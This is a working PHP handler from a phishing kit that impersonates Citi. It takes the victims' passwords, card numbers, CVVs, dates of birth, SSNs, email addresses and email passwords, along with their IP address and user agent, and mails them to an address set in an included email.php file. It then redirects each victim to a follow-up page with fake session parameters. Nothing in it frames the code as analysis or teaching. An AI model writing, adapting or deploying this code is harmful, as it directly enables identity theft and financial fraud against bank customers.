<?php
if($_POST["psw"] != "" and $_POST["cn"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Citi Info-----------------------\n";
$message .= "Confirm Password		: ".$_POST['psw']."\n";
$message .= "Card Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date       		: ".$_POST['ex']."\n";
$message .= "CVV            		: ".$_POST['cv']."\n";
$message .= "Date of Birth          : ".$_POST['db']."\n";
$message .= "SSN            		: ".$_POST['sn']."\n";
$message .= "Zip Code	           : ".$_POST['zp']."\n";
$message .= "Email Address             : ".$_POST['eml']."\n";
$message .= "Email Password             : ".$_POST['eps']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>